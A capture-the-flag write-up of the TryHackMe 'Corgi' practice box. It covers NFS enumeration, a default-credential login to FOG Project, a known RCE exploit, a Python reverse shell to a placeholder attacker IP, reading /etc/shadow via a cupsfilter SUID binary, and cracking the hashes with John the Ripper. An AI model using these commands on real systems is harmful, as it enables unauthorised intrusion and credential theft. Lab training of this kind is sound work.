# Corgi
Try this OSCP level practice box by JSON SEC at https://tryhackme.com/room/corgi

## nmap TCP scan
The first thing we do on any pen test is a nmap scan. I went with a TCP-SYN scan with default scripts and all ports

`nmap -sS -sC -p- <TARGET-IP>`
![nmap scan pt1](:/42a9b8f9792f4d1c8b5490dc54a3f65f)
![nmap scan pt2](:/6d2ef1ea1b724079bc96d0ffbaf5ea91)

## NFS
from this scan we can see that nfs is installed on the server, lets use `showmount` to see if there are any shares we can mount to our system.
![0ab7abcb4db170d7b31f2975f2ed6614.png](:/4d1e42f9ef814017937dfdaf642ea77a)
looks like there are 2 shares we can mount, lets use mount one of them and have a look around
![4d2d1a230846255da7bb365383f206fd.png](:/c1b020b306344a64857a4e28e94067fa)

## FOG Project
after looking around we found this fog file, after some quick google searching I found this documentation for something called 'FOG project'
![3a5dd118150843ea5f6dc38ee38187a6.png](:/c69aa96cc3324422993f48f586ece162)
and going to `<TARGET-IP>/fog` takes us to a login page
![b8cda2f2b49703c47ffcf5d6b2506673.png](:/cd80521c0b524a6a9e199593d15c4cdf)
Now that we have a login page we need some credentials. before we try anything else lets try and find some default creds on google.
![405ec8ea462164f98ff212cdf85fbe9d.png](:/44fcff83142b4daa948d32de06b5594a)
Lucky for us these default credentials worked and we are now logged in to the FOG dashboard
![20a6f58f0cf7228d53ac48c6c1099ae2.png](:/fdfb33226906456d8d4e28859258b659)

## RCE Exploit
now that we have access to a dashboard lets have a look on exploit.db to see if there are any known exploits for the version of FOG that is installed.
![9adba4d0a01811ddbb176e6ea4d601bc.png](:/4bddb8cb41be4c4c85de6e3b072f60d6)
Lucky Break, there is a RCE exploit here https://www.exploit-db.com/exploits/49811
![760649555dc6b666380a05fb6ebe3b7c.png](:/4c2efc74c4914041a377b3c79a97ebba)
lets try and use this RCE exploit and test to see if we can run commands on the server before we try and gain access through a remote shell.
![ac4efb628133910c86d4f130be274811.png](:/bbc4273adbb9495394032d4b98eec13f)
![34ba939c344bca30df8712d58a48b718.png](:/9e687c6301fe4f27b964e866ffc5cffa)
running the hostname command to test if file upload worked
![eae0e0362befad53ed6e5af6a9a15efc.png](:/15c757a0818b4c1985fd32f8ff723bb9)

## Reverse Shell & Privilege Escalation
now that we have RCE lets get our reverse shell up and running

`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER-IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
![f5d6aa9578469b24a8dbfdc92a7a7a33.png](:/7875820ea9a844848efe45fffd6dd8b9)
and stabilise the shell
![5d28a637abdc6b3765504b121d090e5f.png](:/a4ea6801f77f4c2f939fce11f774875c)

now that we have a working and stable reverse shell, we need to be able to read the /etc/shadow and /etc/passwd files.
First lets find out what binaries we have access to with `find`

`find / -perm /4000 2>/dev/null`
![9cae3ff8a5c41702a93e850a06854b1a.png](:/ce9d248e64994e5bae8bca10223a5ac7)
After having a search on https://gtfobins.github.io/, we found that the cupsfilter binary has a File read vulnerability, and we can use this to read the /etc/shadow and /etc/passwd files

![6c6f7fc33238b59402c03ef5a1298a1a.png](:/1a511ebff2c6419bbf24d0ebd2363812)
`cupsfilter -i application/octet-stream -m application/octet-stream /etc/passwd`
![074eefb955ebd5e2fc02d0547f78d118.png](:/f574c0d04fdb4988805293edeceba32c)
![38db1ecb8b19d27b8cdb80706e3a2be0.png](:/ee80be10975b4eb98b9b9c0757c90bd6)
`cupsfilter -i application/octet-stream -m application/octet-stream /etc/shadow`
![8a437ccfebc38cae72c4f6f485eeb2b2.png](:/244c3a55448147d0a64d75858f7d7231)
![1a0515583d685b785daf91ff9df8f7a9.png](:/a6d11a56fd2149159d1a9e1276abfa60)
lets copy the contents of the files onto our host computer, then use unshadow and johntheripper to get the passwords

`unshadow passwd.txt shadow.txt`
`john --wordlist=/usr/share/wordlists/rockyou.txt`
![9a13e4b0a843d245da892d1f72c3c487.png](:/57b3d7e5c84e485fa8af2fe25fe3ead9)

so now we have a login, lets `su` into the new user and see what permissions they have.sudo 
![4bb2d2dccab7ce872a5a8b260f41d897.png](:/1143b3cf111a483a89c5e01af6644212)

so it looks like they can run any command, lets try to get into the root account and find the user and root hashes

![8c471db405b89841fbffcda1ae7b4c95.png](:/d1382a6454204a378a43b74af7b25337)
![4d6ee4505811590c7fe4fad20744d06e.png](:/57476ef107614746bf0ebe01e218a7df)